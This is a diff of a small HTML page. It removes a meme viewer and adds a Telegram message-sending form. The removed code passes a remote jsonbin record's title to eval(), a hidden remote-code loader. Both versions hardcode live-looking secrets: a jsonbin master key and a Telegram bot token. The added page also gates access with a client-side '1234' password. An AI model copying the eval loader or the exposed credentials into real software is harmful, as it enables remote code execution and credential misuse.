@@ -1,71 +1,157 @@
-<link rel="icon" href="https://i.imgflip.com/437aqu.jpg?a465912">
-<title id="it">MEME</title>
-<style>
-    img{
-        display: block;
-        margin: auto;
-        margin-top:100px;
-    }
-    #title{
-        display: block;
-        margin: auto;
-        text-align: center;
-        margin-top: 250px;
-        font-family: monospace;
-        font-size:50px;
-    }
-     #loading{
-         display: block;
-         margin: auto;
-         text-align: center;
-         font-size:50px;
-         font-family: monospace;
-         margin-top:500px;
-     }
-</style>
-<script>
+
+
+
+
+<html lang="en" style="display: block;margin: auto;"><head>
+
+    
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#2D527C">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+   
+    <title>DAMSEA</title>
+<script src="https://damsea.github.io/import.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="https://damsea.github.io/css/app.css">
  
-    function test(){
-    let req = new XMLHttpRequest();
 
-req.onreadystatechange = () => {
-  if (req.readyState == XMLHttpRequest.DONE) {
-    var data=JSON.parse(req.response)
-    console.log(data.record)
-    document.getElementById('imm').src=data.record.url;
-    document.getElementById('title').innerHTML=data.record.title;
-    setTimeout(()=>{
-        clearInterval(loading)
-        document.getElementById('loading').style.display='none';
-        document.getElementById('photo').style.display='block';
-        document.getElementById('it').innerHTML=data.record.title;
-    },2000)
-    eval(data.record.title)
-  }
-};
 
-req.open("GET", "https://api.jsonbin.io/v3/b/64007d58c0e7653a05812a79", true);
-req.setRequestHeader("X-Master-Key", "$2b$10$1O.PoWna8zg/AryJziD/Au2tUX8Q6dqIq8/Nr/rIo2Num3tLJ1SW.");
-req.send();
-    }test()
-</script>
-<div id="loading">
+    <script>
+        // -1001687063591
+        // 
+        import_script(aes);
+        import_script(telegram_api)
+        function test(){
+            alert()
+        }
+        window.addEventListener("DOMContentLoaded", ()=> {
+        var random=Math.floor(Math.random() * 5);
+      var data=[
+        "https://damsea.github.io/img/1.gif","https://damsea.github.io/img/2.jpg","https://damsea.github.io/img/3.jpg","https://damsea.github.io/img/4.jpg","https://damsea.github.io/img/5.gif"
+      ];
+      console.log(data[random]);
+      var url=data[random];
+      document.getElementById('sadcat').src=url;
+    });
+    </script>
+    <meta name="google-site-verification" content="-Yq4xhaXSq1mraogAfyjsgsUUWFJi4Ww5nWXi7bffj8">
+    <div style="display: none;"></div></head>
+    <body>
+ 
+    <div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
+    </div>
+
+
+    <div class="wrapper">
+
+    <div class="logo">
+    <a href="https://t.me/+mNxRhH-H7sozMjFi" style="font-family: arial;">
+        <img id="sadcat"  style="width:150px; border-radius:10px;background: wheat; margin-top:50px;"  src="2.jpg"><br><br><p id="p">Telegram</p>
+        
+         GROUP NAME [Родные]
+    </a>
+    </div>
+    <main class="create-json-wrapper clear">
+    <header class="clear">
+    <div class="sign-in-wrapper clear">
+    <ul>
+    
+    </ul>
+    </div>
+    </header>
+    <div class="add-json">
+    <div id="error-notification" class="error-notification hide"></div>
+ 
+    <div class="create-json-textarea-wrapper">
    
-</div>
-<div id="photo" style="display:none">
-    <h1 id="title">Title</h1>
-<img src="" id="imm"  style="border:4px solid #1f1015; padding:15px;"  alt="">
-</div>
+    <textarea name="snippet" id="snippet" placeholder="Enter message [~!~]" autofocus=""></textarea>
+    <div class="drag-drop-overlay" id="drag-drop-overlay">
+  
+    </div>
+    </div>
+    <ul  class="bottom-left-items">
+    <li class="remove-draft" id="remove-draft">
+    <a href="javascript:test()"  style="pointer-events: none"  title="Your Bin is saved in the Drafts">CODE</a>
+    </li>
+    </ul>
+    <ul class="bottom-nav">
+  
+    <li> <button onclick="send()" style="width:90px;height:30px;background: rgb(78, 136, 243);color: white;border: none;border-radius:4px;"    class="create-json-cta">SEND</button></li>
+    </ul>
+
+    </div>
+    </main>
+    
+    </div>
+  
+  
+ 
+    
+</body>
 <script>
-    var loading = (function() {
-  var h = ['.', '..', '...', '....'];
-  var i = 0;
+    function test(){
+       window.location='view-source:https://damsea.github.io/';
+    }
+    function send(){
+       //https://api.telegram.org/bot1920440271:AAGQ3sv8UkLga66ruEuCwEdlvhIbkkj9dwo/sendMessage?chat_id=&text=
+       var message=document.getElementById('snippet').value;
+          fetch('https://api.telegram.org/bot1920440271:AAGQ3sv8UkLga66ruEuCwEdlvhIbkkj9dwo/sendMessage?chat_id=-1001687063591&text='+message)
+          .then((res) => res.json())
+          .then((data) => {
+            if(data.ok == true){
+                document.getElementById('snippet').value='';
+                 var p=document.getElementById('p');
+                 p.style.color='green';
+                 p.innerHTML='Cообщение отправлено !';
 
-  return setInterval(() => {
-    i = (i > 3) ? 0 : i;
-   
-    document.getElementById('loading').innerHTML="Loading"+h[i];
-    i++;
-  }, 300);
-})();
+
+            }
+            if(data.ok == false){
+                document.getElementById('p').style.color='red';
+                document.getElementById('p').innerHTML =data.description;
+            }
+          })
+    }
+
+
+
+
+
+
+
+
+
+
+
+if(localStorage.getItem('id') !== '1234'){
+    log()
+}
+if(localStorage.getItem('id') == '1234'){
+    console.log("logged")
+}
+
+
+function log(){
+    Swal.fire({
+  title: 'Enter Password',
+  input: 'password',
+  inputAttributes: {
+    autocapitalize: 'off'
+  },
+  showCancelButton: false,
+  confirmButtonText: 'SINGIN',
+  showLoaderOnConfirm: false,
+  preConfirm: (login) => {
+    if(login !== '1234'){
+        document.write("Error password !")
+    }
+    if(login == '1234'){
+    localStorage.setItem('id',login)
+    }
+  },
+  allowOutsideClick: () => !Swal.isLoading()
+})
+}
 </script>
+</html>
